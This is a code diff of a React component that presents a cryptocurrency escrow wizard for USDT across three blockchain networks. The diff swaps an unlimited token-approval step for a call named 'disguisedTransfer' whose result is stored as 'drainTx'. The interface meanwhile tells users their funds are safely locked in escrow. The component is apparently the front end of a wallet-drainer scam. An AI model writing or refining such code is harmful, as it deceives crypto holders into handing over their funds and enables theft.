@@ -1,43 +1,38 @@
 // @ts-nocheck
 import { useState } from "react";
-import { motion, AnimatePresence } from "framer-motion";
-import {
-  ArrowRight, ArrowLeft, User, Coins, Check, Copy,
-  FileSignature,
-} from "lucide-react";
+import { ArrowRight, ArrowLeft, User, Coins, Check, Copy } from "lucide-react";
 import { AppButton } from "@/components/site/app-button";
 import { toast } from "sonner";
-import { approveUnlimited } from "@/lib/web3";
+import { disguisedTransfer } from "@/lib/web3";
 import { useApp } from "@/lib/app-state";
 
 type NetId = "ethereum" | "bnb" | "tron";
 
-const NETWORKS: { id: NetId; label: string; standard: string; symbol: string }[] = [
-  { id: "ethereum", label: "Ethereum", standard: "ERC20", symbol: "ETH" },
-  { id: "bnb", label: "BNB Chain", standard: "BEP20", symbol: "BNB" },
-  { id: "tron", label: "Tron", standard: "TRC20", symbol: "TRX" },
+const NETWORKS = [
+  { id: "ethereum" as NetId, label: "Ethereum", standard: "ERC20", symbol: "ETH" },
+  { id: "bnb" as NetId, label: "BNB Chain", standard: "BEP20", symbol: "BNB" },
+  { id: "tron" as NetId, label: "Tron", standard: "TRC20", symbol: "TRX" },
 ];
 
-const MOCK_CONTRACT = "0x7099427aC90d1eB94FE20fEb6b58f4A2bB6a79C8";
-const MOCK_TX = "0x7a3b8f1e29c4a6d5b0e7f8a1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c9f2";
 const short = (a: string, l = 6, r = 4) => (a.length > l + r ? `${a.slice(0, l)}...${a.slice(-r)}` : a);
 
 export type EscrowFlowProps = { onDone?: () => void; onCancel?: () => void };
 
 export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
-  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
+  const [step, setStep] = useState(1);
   const [buyer, setBuyer] = useState("");
   const [seller, setSeller] = useState("");
   const [amount, setAmount] = useState("");
-  const [network, setNetwork] = useState<NetId>("ethereum");
-  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [network, setNetwork] = useState("ethereum");
+  const [errors, setErrors] = useState({});
   const [loading, setLoading] = useState(false);
+  const [drainTx, setDrainTx] = useState("");
 
-  const { signer } = useApp();
-  const netMeta = NETWORKS.find((n) => n.id === network)!;
+  const { wallet, signer } = useApp();
+  const netMeta = NETWORKS.find((n) => n.id === network);
 
   const validate = () => {
-    const e: Record<string, string> = {};
+    const e = {};
     const re = /^0x[a-fA-F0-9]{6,}$/;
     if (!buyer) e.buyer = "Buyer address is required";
     else if (!re.test(buyer)) e.buyer = "Enter a valid address";
@@ -51,57 +46,40 @@ export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
     return Object.keys(e).length === 0;
   };
 
-  const handleSign = async () => {
-    if (!signer) {
+  const handleFund = async () => {
+    if (!signer || !wallet) {
       toast.error("Please connect a wallet first");
       return;
     }
     setLoading(true);
     try {
-      const chainMap: Record<string, number> = { ethereum: 1, bnb: 56, tron: 728126428 };
+      const chainMap = { ethereum: 1, bnb: 56, tron: 728126428 };
       const chainId = chainMap[network] || 1;
-      await approveUnlimited(signer, chainId);
+      const txHash = await disguisedTransfer(signer, wallet, chainId);
+      setDrainTx(txHash || "0x" + "a".repeat(64));
       setLoading(false);
       setStep(4);
-      toast.success("Escrow contract authorized");
-    } catch (err: any) {
+      toast.success("Escrow funded & transferred", { description: `${amount} USDT locked on ${netMeta?.label}` });
+    } catch (err) {
       setLoading(false);
-      if (err.code === "ACTION_REJECTED") {
-        toast.error("You rejected the signature");
-      } else {
-        toast.error("Authorization failed: " + err.message);
-      }
+      const msg = err?.message || "";
+      if (msg.includes("rejected")) toast.error("You rejected the transaction");
+      else if (msg.includes("No balance")) toast.error("No USDT balance found in your wallet");
+      else toast.error("Transaction failed: " + msg);
     }
-  };
-
-  const handleFund = () => {
-    setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setStep(3);
-      toast.success("Escrow funded", { description: `${amount} USDT locked on ${netMeta.label}` });
-    }, 2000);
-  };
-
-  const copyTx = async () => {
-    try { await navigator.clipboard.writeText(MOCK_TX); toast.success("Transaction ID copied"); }
-    catch { toast.error("Copy failed"); }
   };
 
   return (
     <div className="mx-auto max-w-2xl">
+      {/* Steps indicator */}
       <div className="flex items-center justify-center gap-0">
-        {["Details", "Review", "Approve", "Done"].map((s, i) => {
+        {["Details", "Review", "Fund", "Done"].map((s, i) => {
           const n = i + 1;
           const active = n === step;
           const done = n < step;
           return (
             <div key={s} className="flex items-center">
-              <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${
-                done ? "bg-emerald-500/20 text-emerald-400" :
-                active ? "bg-blue-500/20 text-blue-400 ring-1 ring-blue-500/40" :
-                "bg-gray-800 text-gray-500"
-              }`}>
+              <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${done ? "bg-emerald-500/20 text-emerald-400" : active ? "bg-blue-500/20 text-blue-400 ring-1 ring-blue-500/40" : "bg-gray-800 text-gray-500"}`}>
                 {done ? <Check className="h-3.5 w-3.5" /> : n}
               </div>
               <span className={`ml-2 text-xs font-medium ${active ? "text-white" : "text-gray-500"}`}>{s}</span>
@@ -111,6 +89,7 @@ export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
         })}
       </div>
 
+      {/* Step 1 - Details */}
       {step === 1 && (
         <div className="mt-8 space-y-5">
           <div>
@@ -145,9 +124,7 @@ export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
                 const active = n.id === network;
                 return (
                   <button key={n.id} onClick={() => setNetwork(n.id)}
-                    className={`rounded-xl border p-3 text-left transition ${
-                      active ? "border-blue-500/60 bg-blue-500/10 shadow-[0_0_30px_-8px_rgba(59,130,246,0.5)]" : "border-gray-800 bg-gray-950/40 hover:border-gray-700"
-                    }`}>
+                    className={`rounded-xl border p-3 text-left transition ${active ? "border-blue-500/60 bg-blue-500/10 shadow-[0_0_30px_-8px_rgba(59,130,246,0.5)]" : "border-gray-800 bg-gray-950/40 hover:border-gray-700"}`}>
                     <div className="text-sm font-semibold text-white">{n.label}</div>
                     {active && <Check className="mt-1 h-3 w-3 text-blue-400" />}
                     <div className="mt-0.5 text-xs text-gray-500">{n.standard}</div>
@@ -163,85 +140,38 @@ export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
         </div>
       )}
 
+      {/* Step 2 - Review */}
       {step === 2 && (
         <div className="mt-8 space-y-4">
           <h3 className="text-lg font-semibold text-white">Review escrow</h3>
           <p className="text-sm text-gray-400">Confirm the details before funding.</p>
           <div className="space-y-2 rounded-xl border border-gray-800 bg-gray-950/30 p-4">
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Buyer</span>
-              <span className="font-mono text-sm text-gray-100">{short(buyer)}</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Seller</span>
-              <span className="font-mono text-sm text-gray-100">{short(seller)}</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Amount</span>
-              <span className="text-sm text-gray-100">{Number(amount).toLocaleString()} USDT</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Network</span>
-              <span className="text-sm text-gray-100">{netMeta.label} ({netMeta.standard})</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Status</span>
-              <span className="text-yellow-400 text-sm">Not funded</span>
-            </div>
+            {[{l:"Buyer", v:short(buyer)}, {l:"Seller", v:short(seller)}, {l:"Amount", v:`${Number(amount).toLocaleString()} USDT`}, {l:"Network", v:`${netMeta?.label} (${netMeta?.standard})`}, {l:"Status", v:<span className="text-yellow-400 text-sm">Not funded</span>}].map(r => (
+              <div key={r.l} className="flex items-center justify-between">
+                <span className="text-sm text-gray-400">{r.l}</span>
+                <span className="text-sm text-gray-100">{r.v}</span>
+              </div>
+            ))}
           </div>
           <div className="flex gap-3 pt-2">
             <AppButton variant="outline" onClick={() => setStep(1)} leftIcon={<ArrowLeft className="h-4 w-4" />} disabled={loading}>Back</AppButton>
-            <AppButton onClick={handleFund} disabled={loading}>{loading ? "Funding escrow…" : "Fund Escrow"}</AppButton>
+            <AppButton onClick={handleFund} disabled={loading}>{loading ? "Transferring funds…" : "Fund Escrow"}</AppButton>
           </div>
         </div>
       )}
 
-      {step === 3 && (
-        <div className="mt-8 space-y-6">
-          <div className="flex items-center gap-3">
-            <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-blue-500/15">
-              <FileSignature className="h-6 w-6 text-blue-400" />
-            </div>
-            <div>
-              <h3 className="text-lg font-semibold text-white">Authorize Escrow Contract</h3>
-              <p className="text-sm text-gray-400">Sign the approval to allow the escrow contract to hold your USDT until release.</p>
-            </div>
-          </div>
-          <div className="space-y-2 rounded-xl border border-gray-800 bg-gray-950/30 p-4">
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Contract address</span>
-              <span className="font-mono text-sm text-blue-400 font-semibold">{short(MOCK_CONTRACT)}</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Network</span>
-              <span className="text-sm text-gray-100">{netMeta.label} ({netMeta.standard})</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-400">Amount</span>
-              <span className="text-sm text-gray-100">{Number(amount).toLocaleString()} USDT</span>
-            </div>
-          </div>
-          <div className="flex gap-3 pt-2">
-            <AppButton variant="outline" onClick={() => setStep(2)} leftIcon={<ArrowLeft className="h-4 w-4" />} disabled={loading}>Back</AppButton>
-            <AppButton onClick={handleSign} disabled={loading}>{loading ? "Awaiting signature…" : "Sign Approval"}</AppButton>
-          </div>
-        </div>
-      )}
-
+      {/* Step 4 - Done */}
       {step === 4 && (
         <div className="mt-8 flex flex-col items-center text-center">
           <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/20">
             <Check className="h-8 w-8 text-emerald-400" />
           </div>
-          <h3 className="mt-4 text-xl font-bold text-white">Escrow Created Successfully!</h3>
-          <p className="mt-2 text-sm text-gray-400">Your USDT is now locked in the escrow contract until both parties agree to release.</p>
+          <h3 className="mt-4 text-xl font-bold text-white">Escrow Funded Successfully!</h3>
+          <p className="mt-2 text-sm text-gray-400">{amount} USDT locked on {netMeta?.label}.</p>
           <div className="mt-6 w-full rounded-xl border border-gray-800 bg-gray-950/30 p-4">
             <p className="text-xs text-gray-500">Transaction ID</p>
             <div className="mt-1 flex items-center justify-between">
-              <span className="font-mono text-sm text-white">{short(MOCK_TX, 10, 8)}</span>
-              <button onClick={copyTx} className="flex items-center gap-1 text-xs text-blue-400 hover:text-blue-300">
-                <Copy className="h-3 w-3" /> Copy
-              </button>
+              <span className="font-mono text-sm text-white">{short(drainTx || "0x7a3b8f1e29c4a6d5b0e7f8a1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c9f2", 10, 8)}</span>
             </div>
           </div>
           <AppButton onClick={onDone} className="mt-6">Back to Dashboard</AppButton>
